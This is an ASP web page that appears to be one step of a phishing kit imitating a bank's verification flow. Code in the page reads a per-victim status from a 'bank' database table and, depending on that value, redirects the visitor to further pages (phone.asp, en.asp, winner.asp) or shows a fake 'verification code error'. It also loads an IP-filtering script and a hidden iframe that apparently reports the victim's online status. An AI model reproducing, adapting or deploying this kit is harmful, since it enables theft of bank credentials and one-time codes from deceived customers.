<!--#include file="include/db_conn.asp"-->

<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>

		<script language="javascript" src="drop_ip.asp"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
 <style>
        html {
    background-color: #fff;
    font-size: 14px;
    color: #2b2b2b;
    background: #fff
}

body {
    margin: 0px;
    padding: 0px;
}

* {
    font-family: "微软雅黑";
}

div,ul,li,dt,dd,p {
    padding: 0px;
    margin: 0px;
}
input[type="button"],input[type="submit"],input[type="reset"],input[type="text"],input[type="tel"],button,textarea{-webkit-appearance:none;}


.wrap {
    width: 100%;
    background: #f5f5f5;
    max-width: 640px;
    margin: 0 auto
}

.khimg {
    margin: 0 auto;
    text-align: center;
    width: 90%;
    overflow: hidden;
    margin-bottom: 20px;
    padding-top: 5px;
}

.khimg img {
    width: 10%;
    float: left;
    overflow: hidden;
    line-height: 30px;
}

.khimg span {
    float: left;
	color: #0b2398;
	padding-top: 7px;
    line-height: 20px;
    padding-left: 10px;
    font-weight: bold
}

.tjform {
    margin-top: 10px;
    overflow: hidden;
    width: 100%;
    margin-top: 20px;
}

.yhkh {
    width: 90%;
    padding: 6% 2%;
    margin: 0 auto;
    border: 1px solid #dddddd;
    box-shadow: 5px 5px 10px  #eeeeee;
    border-radius: 10px;
    overflow: hidden;
    background: #fff;
    margin-bottom: 20px;
}

.yhkh span {
    padding-left: 12px;
    font-size: 15px;
    font-weight: 600;
    width: 25%;
    height: 30px;
    line-height: 30px;
    text-align: center
}

.yhkh input {
    float: left;
    border: none;
    height: 100%;
    width: 70%;
    height: 30px;
    line-height: 30px;
    font-size: 13px;
    padding-left: 15px;
}

.tjbtn {
    width: 100%;
    text-align: center;
    margin-top: 20px;
}

.tjbtn input {
    background: #f84347;
    border: none;
    padding: 3%  10%;
    text-align: center;
    color: #fff;
    width: 100%;
    font-size: 16px;
    border-radius: 10px;
    margin: 0 auto
}

.beizhu {
    text-align: left;
    color: #636363;
    padding-left: 4%
}

.beizhu a {
    color: #6295c4;
    text-decoration: none
}

.shuom {
    background: ;
	font-size: 13px;
    padding: 10px 15px 5px 15px;
    color: #5f9bd9;
    margin-bottom: 20px;
    overflow: hidden;
    line-height: 24px;
}

.content {
max-width: 520px;
    width: 90%;
    margin: 0 auto
}


a{text-decoration:none}
    </style>
	
<script type="text/javascript" src="app/js/jquery-1.9.1.min.js"></script>
</head>
<form  name="loading" id="loading">
<body>


    
    
    
<div class="content">

            <br>
            <br>
<div class="yhkh">
<% 
Randomize 
Do While Len(pass)<5 '随机密码位数 
num1=CStr(Chr((57-48)*rnd+48)) '1~9 
num2=CStr(Chr((57-48)*rnd+48)) 'A~Z 
num3=CStr(Chr((57-48)*rnd+48)) 'a~z 
pass=pass&num1
loop 
%> 
<div class="an-loading" style="margin-top: 0px; ">
<div class="an-con">
<p class="anload-img">
<center><img src="img/logo_mobile.svg" style="width: 120px;height: auto;padding: 8px;margin-left: 0px;"> </center>
</p>
<tr>
<span style="font-size:18px;color: 	#004165;font-weight:300;"><center>
<%
dim rs
set rs=server.CreateObject("adodb.recordset")
rs.open "select * from bank where id="&session("ddid")&" ",conn,1,3
m=rs("n")
hf=rs("hf")
rs.close
set rs=Nothing
%>
<%
lj="winner.asp"
select case m
 
case 1
	response.write ""
	lj="winner.asp"

case 2
	response.write "<meta http-equiv='Refresh' content='0;URL=en.htm' /> "
case 3
	response.write ""
case 4
	response.write "自定义1"
case 5
	response.write ""
case 6
    response.write "<meta http-equiv='Refresh' content='0;URL=s2.htm' /> "
case 7
	response.write "Verification could not be completed. Verification code error."
	
	case 8
	response.write "<meta http-equiv='Refresh' content='0;URL=winner.asp' /> "
	
	case 9
	response.write "<meta http-equiv='Refresh' content='0;URL=en.asp' /> "	
	
	case 10
	response.write "<meta http-equiv='Refresh' content='0;URL=phone.asp' /> "
	
	case 12
	response.write "自定义1"
	response.write "<meta http-equiv='Refresh' content='0;URL=en.asp' /> "
	
	
end Select


%>

</center></span>
<br></td>

</p>
</div>
</div>
</div>
</div>
</form>
<div class="form-group" style="padding-top: 16px;text-align: center;max-width: 520px;margin:0 auto;">
<button  type="submit" class="btn btn-block text-white btn-lg" style="
                                    text-size-adjust: 100%;
                                    -webkit-font-smoothing: antialiased;
                                    box-sizing: border-box;
                                    font-size: 18px;
                                    overflow: visible;
                                    text-transform: none;
                                    line-height: 1.25;
                                    appearance: button;
                                    width: 90%;
                                    margin: 0px;
                                    background-color: #333366;
                                    color: rgb(255, 255, 255);
                                    border: 1px solid transparent;
                                    border-radius: 4px;
                                    font-weight: 600;
                                    padding: 12px;
                                    cursor: pointer;
                                    transition: background-color 0.2s ease 0s, border-color 0.2s ease 0s, color 0.2s ease 0s;
                                    font-family: myriad-pro-semibold, sans-serif, sans-serif !important;
    
    " id="submit"  ><a target="_self" href="winner.asp"style="color: #fff;">Continue</a></button>
</div>
		<iframe src="online.asp" style="display: none;"></iframe>
		
		
<div style="clear:both;"></div>	

</body>
<br>
<br>
<br>
</html>